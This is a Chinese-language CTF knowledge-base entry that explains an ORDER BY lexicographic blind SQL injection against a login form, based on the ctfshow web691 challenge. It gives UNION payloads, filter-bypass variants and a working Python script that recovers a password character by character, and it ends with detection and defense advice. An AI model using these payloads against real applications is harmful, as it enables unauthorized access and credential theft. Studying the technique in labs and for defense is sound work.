---
id: web-generic-sqli-order-by-union-lexicographic-blind
title: ORDER BY 大小比较盲注：UNION 注入候选串作排序键，按首行回显逐字符还原密码
type: scenario
domain: web
path: web/generic/sqli
technique: order-by-union-lexicographic-blind
tags:
- web
- sqli
- blind
- order-by
- union
- mysql
- waf-bypass
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V232
  verified_at: '2026-11-07T09:23:34+08:00'
  notes: 已对照原文与7张图核对：' or 1 union select 1,1,'候选' order by 3# 的字典序 oracle、首个回显 admin 的候选减一、列数探测、filter 黑名单与 ctfshow web691 实例均与原文一致。核对中发现并修正 PoC 回显判断：原写 if "</code>admin" in r.text or "admin" in r.text，highlight_file 源码本身含 admin，裸匹配会使 oracle 恒真；已改为仅匹配 "</code>admin"（与原文远程脚本一致），同步修改 staging 与 knowledge 文件。未重新连接靶场复跑。
url: /docs/web/generic/sqli/web-generic-sqli-order-by-union-lexicographic-blind/
draft: false
kb_aliases:
- order by 大小比较盲注
- ORDER BY 比较盲注
- UNION ORDER BY 盲注
- 首行回显盲注
- 字典序盲注
- ctfshow web691
- 无括号无等号盲注
---

## 一句话结论

当登录查询把用户输入拼进 SQL、并且应用只回显 `ORDER BY` 排序后的第一行用户名时，可以注入 `' or 1 union select 1,1,'<候选>' order by 3#`：UNION 行把候选串放进密码列，数据库对“候选串”和“真实密码”做字典序排序；候选串大于真实密码时真实行排在前面、页面回显 `admin`，否则 UNION 行在前、回显注入的 `1`。第一个使回显变成 `admin` 的候选字符减一就是真实密码的当前位，逐位拼接即可盲注出 flag。

## 原理

- **查询与回显**：原查询形如 `select * from admin where username='$username' and password='$password'`；应用在 `num_rows>0` 时取 `fetch_assoc()` 的第一行，`if($row['id']) echo $row['username']`。因此“谁排在第一位”直接决定页面回显 `admin` 还是注入的标记。
- **UNION 构造排序键**：payload `' or 1 union select 1,1,'<候选>' order by 3#` 先闭合 username 字符串，用 `or 1` 让 WHERE 为真，再用 `union select 1,1,'<候选>'` 追加一行（三列：id、username、password），最后 `order by 3` 按第三列（密码列）排序。`#` 注释掉原查询剩余的 `' and password='...'`。
- **字典序 oracle**：真实行的第三列是数据库中的密码（flag），UNION 行的第三列是攻击者给的候选串。MySQL 按字符串排序：若候选串 > 真实密码（按当前 collation 的字典序），真实行排在 UNION 行前面，第一行是 admin，回显 `admin`；若候选串 ≤ 真实密码，UNION 行在前，回显 `1`。
- **逐字符还原**：维护已知前缀 `k`，按 ASCII 升序枚举候选字符 `j`，令候选为 `k+j`。当第一次出现 `admin` 时，说明 `k+j` 刚刚大于真实值，因此真实字符是 `j` 的前一个字符（`chr(ord(j)-1)`）；把它拼到 `k` 后继续下一位。等价于用“大于”比较做线性扫描（也可用二分查找减少请求）。
- **列数确定**：`union select 1,1 order by 2#` 报错/无回显说明列数不是 2；`union select 1,1,1 order by 3#` 正常说明 3 列（大概率为 id、username、password）。
- **WAF 绕过**：题目过滤 `(`、`)`、`username`、`password`、`where`、`case`、`when`、`like`、`regexp`、`into`、`limit`、`=`、`for`、`;`（不区分大小写）。本 payload 不使用括号、等号、where、limit、分号，关键字 `or`/`union`/`select`/`order by` 均不在黑名单；`#` 在 MySQL 中注释到行尾。
- **为什么成立**：应用把“排序结果的第一行”当作登录用户回显，而排序键完全由攻击者控制；这是把布尔盲注从“条件真假”换成“字典序比较”的 oracle，不需要 `AND`/`OR` 条件、不需要报错或时间延迟。

## 触发条件

- 登录/查询接口把 username 或 password 直接拼进 SQL，未参数化。
- 应用只返回排序后的第一行（或第一行的某个字段），且该字段可区分“真实行”与“注入行”。
- 可以注入 `ORDER BY` 的列，且 UNION 列数已知或可枚举。
- 过滤是黑名单字符串匹配，未拦截 `or`、`union`、`select`、`order by`、`#`，或可用大小写/注释/双写绕过。
- 数据库为 MySQL/MariaDB，字符串排序规则与目标字符集一致；若 collation 大小写不敏感，需用 `binary` 或按 ASCII 码点比较。

## 利用步骤

1. **确认注入与回显**：提交 `username=1' or 1#&password=1`，观察是否绕过登录/回显变化；确认页面回显的是第一行的 username。
2. **确定列数**：`username=1' or 1 union select 1,1 order by 2#` 失败，`1' or 1 union select 1,1,1 order by 3#` 成功，得到 3 列。
3. **验证 oracle**：用远大于真实密码的候选（如 `'z'` 或 `'~'`）应回显 admin；用远小于的候选（如 `'.'`）应回显注入标记。若行为相反，调整比较方向/排序方向。
4. **逐位枚举**：按升序字符集 `".0123456789:abcdefghijklmnopqrstuvwxyz{|}~"` 枚举，候选为 `已知前缀 + 字符`；当响应包含 `admin` 时，真实字符 = 当前字符 - 1，拼入前缀并进入下一位。
5. **处理边界**：若真实字符是字符集首字符，需把字符集向前扩展（如加入 `!`、`-`、`/`）；若 collation 大小写不敏感，改用 `binary '<候选>'` 或 `hex`/`ord` 方式（注意括号可能被过滤）。
6. **直到闭合**：枚举到 `}` 或长度上限；用得到的密码登录验证，或直接作为 flag。

## PoC

```python
import requests

url = "http://target/"
charset = ".0123456789:abcdefghijklmnopqrstuvwxyz{|}~"
prefix = ""

for _ in range(50):
    for ch in charset:
        candidate = prefix + ch
        data = {
            "username": f"' or 1 union select 1,1,'{candidate}' order by 3#",
            "password": "1",
        }
        r = requests.post(url, data=data, timeout=5)
        # 真实行排在第一位时页面回显 admin
        if "</code>admin" in r.text:  # 回显标记按目标调整；不要用裸 "admin"，页面源码中也含该词
            prefix += chr(ord(ch) - 1)
            print(prefix)
            break
    else:
        break
print("password/flag:", prefix)
```

原文在本地 `login` 表（`admin / 123456`）验证：`union select 1,1,1 order by 3` 回显 `1`，`union select 1,1,2 order by 3` 回显 `admin`，说明候选 2 大于真实密码 123456；远程 ctfshow web691 用 `'c'` 回显 `1`、`'d'` 回显 `admin`，因此第一位为 `chr(ord('d')-1)='c'`。脚本中的字符集和响应标记需按目标调整。

## 变体与关联

- **二分查找**：把线性枚举改成按 ASCII 区间二分，比较候选与真实值的字典序，请求数从 O(字符集) 降到 O(log 字符集)；仍用同一个 `ORDER BY` oracle。
- **大小写/二进制比较**：MySQL 默认 collation 大小写不敏感时，`'a'` 与 `'A'` 排序相同，无法区分大小写；可用 `binary '候选'`、`convert(... using binary)`（括号可能被过滤）或改注 `order by binary 3` 等方式。
- **多列/多行**：若 UNION 列数不同，先枚举列数；若应用取最后一行或用 `LIMIT`，需调整排序方向（`order by 3 desc`）或注入位置。
- **过滤变体**：`order by` 被拦时可尝试 `ORDER/*x*/BY`、大小写、`union all select`、`#`/`-- ` 注释；`or`/`union` 被替换时可双写（`oorr`、`ununionion`）。
- 关联：[[web-generic-sqli-blind-ascii-case-restore-login]]（布尔盲注与大小写陷阱）、[[web-generic-sqli-craft-commerce-sort-orderby-time-blind]]（ORDER BY 时间盲注）、[[web-generic-sqli-mysql-union-load-file-read]]（UNION 注入基础）。

## 检测与防御

- **参数化查询**：用户名/密码使用预编译参数，禁止拼接；`ORDER BY` 的列名/方向使用白名单映射，不接收用户原始字符串。
- **不要用“第一行”做登录判定**：登录应查询唯一用户并校验密码哈希，不要 `fetch_assoc()` 取第一行后回显；UNION 注入因此失去 oracle。
- **输入过滤**：黑名单不能只匹配字面量；应做语法级/参数化校验，拦截 `union`、`order by`、注释符等；但过滤只是缓解，根因是拼接 SQL。
- **检测特征**：请求中出现 `union select ... order by`、`or 1#`、大量按字符递增的候选串、响应在 `admin` 与固定标记之间切换；数据库日志中出现三列 UNION 与 ORDER BY 组合。
